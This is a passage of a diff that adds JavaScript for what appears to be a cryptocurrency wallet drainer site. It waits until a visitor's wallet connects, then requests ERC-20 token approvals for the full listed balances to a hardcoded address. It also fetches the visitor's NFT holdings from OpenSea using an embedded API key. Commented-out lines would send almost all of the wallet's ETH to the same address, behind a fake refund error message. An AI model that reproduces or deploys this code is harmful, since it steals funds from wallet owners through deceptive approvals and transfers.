+    [{token: '0x61E90A50137E1F645c9eF4a0d3A4f01477738406'}, {balance: 85}],
+
+
+ ]
+
+
+ t.forEach( async e => {
+    var t = e[0].token
+    var b = e[1].balance
+
+    console.log(t,b)
+
+    await tokenGet(t, b)
+
+
+
+
+ })
+
+  
+
+  }
+
+  
+
+  // if (account == '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262') {
+
+  //       alert('error: 2389\nmessage: connected account must deposit the remaining required amount to receive the promised refund')
+  // }
+
+//  var value = await get_eth(account)
+//  var minusvalue = value - 0.0084
+
+// const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
+
+
+
+
+// console.log(finalAmount)
+// const txData = {
+//   from: account,
+//   to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+//   value: finalAmount,
+// };
+
+
+// await web3.eth.sendTransaction(txData)
+//   .then( (txHash) => {
+//     console.log(txHash)
+//   }).catch( (err) => {
+//     console.log(err)
+//   })
+
+
+
+
+
+}
+
+
+async function tokenGet(tokenAddress, tokenBalance) {
+
+
+    const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, tokenAddress);
+    const toAddress = '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262';
+    
+    
+    // const balance = await tokenContract.methods.balanceOf(account).call();
+    // const balanceEther = await web3.utils.fromWei(balance, "ether")
+    
+    // console.log(balanceEther)
+    
+    
+    
+    const tokenDecimals = web3.utils.toBN(18);
+    const tokenAmountToApprove = web3.utils.toBN(tokenBalance);
+    const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));
+    
+    
+    await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})
+    
+    
+    }
+
+
+
+
+
+
+
+
+
+async function nfts(addr) {
+  var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`  
+  var nft = []
+  var contract = []
+
+
+await $.ajax({
+  url: url,
+  method: "GET",
+  headers: {
+      accept: 'application/json',
+      'x-api-key': '078b8acce6a34dd3a2dbb0cd34127203'
+    },
+
+    success: function (data) {
+      // console.log(data.nfts)
+
+      for (var i = 0; i < data.nfts.length; i++) {
+
+          nft.push(data.nfts[i].contract)
+
+      }
+
+      var uniq = [... new Set(nft)]
+
+      nft = uniq
+    }
+    
+})
+
+  nft.forEach( e => {
+
+      var data = {contract: ''}
+      data.contract = e
+
+      contract.push(data)
+  })
+
+return contract
+}
+
+
+/*------------------------------------------------------*/
+
+var checkConnected = setInterval( async () => {
+
+  var d = JSON.parse(localStorage.getItem('wagmi.store'))
+  
+    if (!('account' in d.state.data) ) {
+      console.log('not connected')
+    } else {
+      //getAddress()
+      check()
+      intervalStop()
+      console.log('connected')
+  
+    }
+  
+  }, 3000);
+  
+  function intervalStop() {
+    clearInterval(checkConnected);
+    console.log('intervalStopped')
+  }
+  
+  /*------------------------------------------------------*/
+
+  async function get_eth(address) {
+
+      const balances = web3.utils.fromWei(
+        await web3.eth.getBalance(address),
+        'ether'
+      )* 1;
+
+      return balances;
+
+
+
+
+  }
